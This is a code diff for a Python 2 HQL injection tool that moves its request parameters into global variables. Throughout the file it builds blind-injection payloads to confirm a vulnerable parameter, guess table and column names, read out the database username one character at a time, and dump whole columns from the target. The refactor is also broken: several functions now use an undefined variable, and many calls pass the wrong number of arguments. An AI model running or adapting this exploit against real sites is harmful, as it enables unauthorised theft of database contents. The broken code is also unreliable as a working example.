@@ -4,13 +4,17 @@ import requests
 import sys
 import re
 import math
+import copy
 
-COOKIE = ""
+COOKIE = ''
 TABLES = {}
-USER = ""
+USER = ''
 VERBOSE_MODE = False
-USER_AGENT = ""
-REFERER = ""
+USER_AGENT = ''
+REFERER = ''
+URL = ''
+PARAMS = {}
+PARAM_TO_TEST = ''
 
 
 def send_HTTP_request(url, params):
@@ -22,15 +26,15 @@ def send_HTTP_request(url, params):
     headers = {'Cookie': COOKIE, 'Referer': REFERER, 'User-Agent': USER_AGENT}
 
     # Check that there's POST data
-    params_copy = params.copy()
+
     postdata = False
-    if ('postdata' in params_copy and params_copy['postdata'] is not None):
-        postdata = urllib.urlencode(params_copy['postdata'])
-        del params_copy['postdata']
+    if ('postdata' in params and params['postdata'] is not None):
+        postdata = urllib.urlencode(params['postdata'])
+        del params['postdata']
 
     # Create the url and encode (present) params if necessary
-    if (params_copy != {}):
-        url = url + '?' + urllib.urlencode(params_copy)
+    if (params != {}):
+        url = url + '?' + urllib.urlencode(params)
 
     display_message("URL : " + url)
 
@@ -77,33 +81,38 @@ def table_exists(message):
         return True
 
 
-def check_if_host_vulnerable(url, params, param_to_test):
-    params = set_payload_in_param(params, param_to_test, "'")
+def check_if_host_vulnerable(url, param_to_test):
 
-    req = send_HTTP_request(url, params)
+    params_copy = set_payload_in_param("'")
+
+    req = send_HTTP_request(url, params_copy)
     if ('org.hibernate.QueryException' in req.content):
         print "Host seems vulnerable."
     else:
         raise Exception('No Query Exception in the HTTP response.')
 
 
-def set_payload_in_param(params, param_to_test, payload):
-    params = params.copy()
-    if (param_to_test not in params):
-        if (param_to_test not in params['postdata']):
-            print "ERROR: No " + param_to_test + " in params"
+def set_payload_in_param(payload):
+    global PARAM_TO_TEST
+    global PARAMS
+
+    params_copy = copy.deepcopy(PARAMS)
+
+    if (PARAM_TO_TEST not in params_copy):
+        if (PARAM_TO_TEST not in params_copy['postdata']):
+            print "ERROR: No " + PARAM_TO_TEST + " in params"
         else:
-            params['postdata'][param_to_test] = params['postdata'][param_to_test] + payload
+            params_copy['postdata'][PARAM_TO_TEST] = params_copy['postdata'][PARAM_TO_TEST] + payload
     else:
-        params[param_to_test] = params[param_to_test] + payload
-    return params
+        params_copy[PARAM_TO_TEST] = params_copy[PARAM_TO_TEST] + payload
+    return params_copy
 
 
 ###########################
 ### Tables
 ###########################
 
-def find_tables(url, params, param_to_test, file_table):
+def find_tables(file_table):
     global TABLES
 
     tables_to_test = []
@@ -113,12 +122,13 @@ def find_tables(url, params, param_to_test, file_table):
     # removing new line
     for table in tables_to_test:
         table = remove_new_line_from_string(table)
-        find_table(url, params, param_to_test, table)
+        find_table(table)
 
 
-def find_table(url, params, param_to_test, table_name):
-    params = set_payload_in_param(params, param_to_test, "'and (select count(*) from " + table_name + ") >= 0 or ''='")
-    req = send_HTTP_request(url, params)
+def find_table(table_name):
+
+    params_copy = set_payload_in_param("'and (select count(*) from " + table_name + ") >= 0 or ''='")
+    req = send_HTTP_request(url, params_copy)
     if (table_exists(req.content)):
         insert_table_name_in_tables(table_name)
     else:
@@ -129,7 +139,7 @@ def find_table(url, params, param_to_test, table_name):
 ###########################
 
 
-def find_columns(url, params, param_to_test, file_column, table_name=None):
+def find_columns(file_column, table_name=None):
     global TABLES
 
     columns_to_test = []
@@ -141,25 +151,25 @@ def find_columns(url, params, param_to_test, file_column, table_name=None):
             for column in columns_to_test:
                 # removing new line
                 column = remove_new_line_from_string(column)
-                find_column(url, params, param_to_test, table, column)
+                find_column(table, column)
     else:
         for column in columns_to_test:
             # removing new line
             column = remove_new_line_from_string(column)
-            find_column(url, params, param_to_test, table_name, column)
+            find_column(table_name, column)
 
 
-def find_column(url, params, param_to_test, table, column_name):
+def find_column(table, column_name):
     global TABLES
 
     if (table not in TABLES):
-        find_table(url, params, param_to_test, table)
+        find_table(table)
         if (table not in TABLES):
             raise Exception('Table ' + table + ' does not exist ?')
 
-    params = set_payload_in_param(params, param_to_test, "'and (select count(w." + column_name + ") from " + table + " w) >= 0 or ''='")
+    params_copy = set_payload_in_param("'and (select count(w." + column_name + ") from " + table + " w) >= 0 or ''='")
 
-    req = send_HTTP_request(url, params)
+    req = send_HTTP_request(url, params_copy)
     if (column_exists(req.content)):
         insert_column_in_table(table, column_name)
     else:
@@ -170,7 +180,7 @@ def find_column(url, params, param_to_test, table, column_name):
 ###########################
 
 
-def get_dbms_username(url, params, param, message):
+def get_dbms_username(url, param, message):
     global TABLES
     global USER
 
@@ -183,11 +193,11 @@ def get_dbms_username(url, params, param, message):
 
     # get the count of the table
     request = "' and (SELECT count(*) FROM " + table_to_test + ") "
-    count_table = retrieve_count_or_length(url, params, param, message, request)
+    count_table = retrieve_count_or_length(url, param, message, request)
 
     # get the length of the username
     request = "' and (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM " + table_to_test + ") "
-    count_user = retrieve_count_or_length(url, params, param, message, request)
+    count_user = retrieve_count_or_length(url, param, message, request)
 
     length_user = int(count_user) - int(count_table)
     display_message("Count of table  " + table_to_test + ": " + count_table)
@@ -197,7 +207,7 @@ def get_dbms_username(url, params, param, message):
     username_str = ""
     while (i <= int(count_user)):
         request = "' and (SELECT substring(CONCAT(COUNT(*), '/', USER()), " + str(i) + ", 1) FROM " + table_to_test + ") "
-        char = int(retrieve_count_or_length(url, params, param, message, request, True))
+        char = int(retrieve_count_or_length(url, param, message, request, True))
         username_str = username_str + chr(char)
         i = i + 1
 
@@ -209,22 +219,22 @@ def get_dbms_username(url, params, param, message):
 ###########################
 
 
-def get_count_of_tables(url, params, param, message):
+def get_count_of_tables(url, param, message):
     global TABLES
 
     for table in TABLES:
-        get_count_of_table(url, params, param, message, table)
+        get_count_of_table(url, param, message, table)
 
 
-def get_count_of_table(url, params, param_to_test, message, name_table):
+def get_count_of_table(message, name_table):
 
     request = "' and (SELECT count(*) FROM " + name_table + ") "
-    count = retrieve_count_or_length(url, params, param_to_test, message, request)
+    count = retrieve_count_or_length(message, request)
 
     print "[!] Count(*) of " + name_table + " : " + str(count)
 
 
-def retrieve_count_or_length(url, params, param_to_test, message, request, isChar=False):
+def retrieve_count_or_length(message, request, isChar=False):
     inf = 0
     sup = 10
 
@@ -233,20 +243,20 @@ def retrieve_count_or_length(url, params, param_to_test, message, request, isCha
         sup_str = '{:g}'.format(sup)
 
         if (isChar):
-            params = set_payload_in_param(params, param_to_test, request + " = CHAR(" + inf_str + ") or ''='")
+            params_copy = set_payload_in_param(request + " = CHAR(" + inf_str + ") or ''='")
         else:
-            params = set_payload_in_param(params, param_to_test, request + " = " + inf_str + " or ''='")
+            params_copy = set_payload_in_param(request + " = " + inf_str + " or ''='")
 
-        req = send_HTTP_request(url, params)
+        req = send_HTTP_request(url, params_copy)
         if (message in req.content):
             break
 
         if (isChar):
-            params = set_payload_in_param(params, param_to_test, request + " >= CHAR(" + sup_str + ") or ''='")
+            params_copy = set_payload_in_param(request + " >= CHAR(" + sup_str + ") or ''='")
         else:
-            params = set_payload_in_param(params, param_to_test, request + " >= " + sup_str + " or ''='")
+            params_copy = set_payload_in_param(request + " >= " + sup_str + " or ''='")
 
-        req = send_HTTP_request(url, params)
+        req = send_HTTP_request(url, params_copy)
         if (message in req.content):
             inf = sup
             sup = (2 * inf)
@@ -293,12 +303,13 @@ def insert_column_in_table(table_name, column_name):
 ###########################
 
 
-def list_columns(url, params, param_to_test):
+def list_columns(url, param_to_test):
 
     global TABLES
-    params = set_payload_in_param(params, param_to_test, "' and test=1 and ''='")
 
-    req = send_HTTP_request(url, params)
+    params_copy = set_payload_in_param("' and test=1 and ''='")
+
+    req = send_HTTP_request(url, params_copy)
     if ('not found; SQL statement' in req.content):
         # pattern for the columns
         pattern = re.compile(r'(([a-zA-Z_-]+)[0-9]+_\.([a-zA-Z0-9_-]+)\s)')
@@ -336,9 +347,10 @@ def display_message(message):
 ###########################
 
 
-def dump_table_by_column(url, params, param_to_test, table, column):
-    params = set_payload_in_param(params, param_to_test, "'and (select cast(concat('///', group_concat(" + column + "), '///') as string) from " + table + ")=1or ''='")
-    req = send_HTTP_request(url, params)
+def dump_table_by_column(table, column):
+
+    params_copy = set_payload_in_param("'and (select cast(concat('///', group_concat(" + column + "), '///') as string) from " + table + ")=1or ''='")
+    req = send_HTTP_request(url, params_copy)
     results = get_result_from_dump(req.content)
     print "[" + table + "]\n\t[" + column + "]"
     for res in results:
@@ -392,56 +404,55 @@ else:
     VERBOSE_MODE = opts.verbose
     USER_AGENT = opts.user_agent
     REFERER = opts.referer
+    PARAM_TO_TEST = opts.param
+    URL = opts.url
 
     # check for GET params
-    params = {}
     try:
-        params = opts.url.split('?')[1]
-        #params = dict((k, v if len(v) > 1 else v[0]) for k, v in urlparse.parse_qs(params).iteritems())
-        params = extract_params(params)
-        display_message("GET parameters are present. %s" % params)
+        PARAMS = opts.url.split('?')[1]
+        PARAMS = extract_params(PARAMS)
+        display_message("GET parameters are present. %s" % PARAMS)
     except:
         display_message("No GET Parameters")
         pass
 
-    # check for POST params
-    params['postdata'] = None
+    # check for POST PARAMS
+    PARAMS['postdata'] = None
     if (opts.postdata is not None):
-        #params['postdata'] = dict((k, v if len(v) > 1 else v[0]) for k, v in urlparse.parse_qs(opts.postdata).iteritems())
-        params['postdata'] = extract_params(opts.postdata)
-        display_message("POST parameters are present. %s" % params['postdata'])
+        PARAMS['postdata'] = extract_params(opts.postdata)
+        display_message("POST parameters are present. %s" % PARAMS['postdata'])
     else:
-        # if no POST params, delete the entry
+        # if no POST delete the entry
         display_message("No POST parameters.")
-        del params['postdata']
+        del PARAMS['postdata']
 
-    if (opts.param not in params and opts.param not in params['postdata']):
+    if (opts.param not in PARAMS and opts.param not in PARAMS['postdata']):
         raise Exception('Param "%s" is not present in the request!' % opts.param)
 
     url = opts.url.split('?')[0]
 
     # --check flag
     if (opts.check):
-        check_if_host_vulnerable(url, params, opts.param)
+        check_if_host_vulnerable()
 
     # --tables flag
     if (opts.tables):
         display_message("Trying to gather as much tables..")
-        find_tables(url, params, opts.param, opts.file_table)
+        find_tables(opts.file_table)
 
     # -T=<name> flag
     if (opts.table):
         display_message("Checking if " + opts.table + " exists.")
-        find_table(url, params, opts.param, opts.table)
+        find_table(opts.table)
 
     # --columns flag
     if (opts.columns):
         if (opts.tables):
             display_message("Trying to find columns for all tables")
-            find_columns(url, params, opts.param, opts.file_column)
+            find_columns(opts.file_column)
         elif(opts.table is not None):
             display_message("Trying to find columns for table " + opts.table)
-            find_columns(url, params, opts.param, opts.file_column, opts.table)
+            find_columns(opts.file_column, opts.table)
         else:
             print "ERROR : No table flag specified. "
 
@@ -450,23 +461,23 @@ else:
         if (opts.tables):
             display_message("Trying to find column " + opts.column + " for all tables")
             for table in TABLES:
-                find_column(url, params, opts.param, table, opts.column)
+                find_column(table, opts.column)
         elif(opts.table is not None):
             display_message("Trying to find column " + opts.column + " for table " + opts.table)
-            find_column(url, params, opts.param, opts.table, opts.column)
+            find_column(opts.table, opts.column)
         else:
             print "ERROR : No table flag specified. "
 
     # --user flag
     if (opts.user):
-        get_dbms_username(url, params, opts.param, opts.blind_hqli_message)
+        get_dbms_username(opts.blind_hqli_message)
 
     # --count flag
     if (opts.count):
         if (opts.tables):
-            get_count_of_table(url, params, opts.param, opts.blind_hqli_message)
+            get_count_of_table(opts.blind_hqli_message)
         elif(opts.table is not None):
-            get_count_of_table(url, params, opts.param, opts.blind_hqli_message, opts.table)
+            get_count_of_table(opts.blind_hqli_message, opts.table)
         else:
             print "ERROR : No table flag specified. "
 
@@ -474,24 +485,24 @@ else:
     if (opts.dump):
         if (opts.columns):
             # list columns as well
-            list_columns(url, params, opts.param)
+            list_columns(url, opts.param)
         if (opts.tables):
             for table in TABLES:
                 if (opts.columns):
                     for column in TABLES[table]:
-                        dump_table_by_column(url, params, opts.param, table, column)
+                        dump_table_by_column(table, column)
                 elif(opts.column is not None):
-                    dump_table_by_column(url, params, opts.param, table, opts.column)
+                    dump_table_by_column(table, opts.column)
 
         if (opts.table):
             if (opts.columns):
                 for column in TABLES[opts.table]:
-                    dump_table_by_column(url, params, opts.param, opts.table, column)
+                    dump_table_by_column(opts.table, column)
             elif(opts.column is not None):
-                dump_table_by_column(url, params, opts.param, opts.table, opts.column)
+                dump_table_by_column(opts.table, opts.column)
 
     # enumerate tables and columns found if flag passed
     if (opts.results):
         # list columns
-        list_columns(url, params, opts.param)
+        list_columns(url, opts.param)
         enumerate_tables_and_columns()
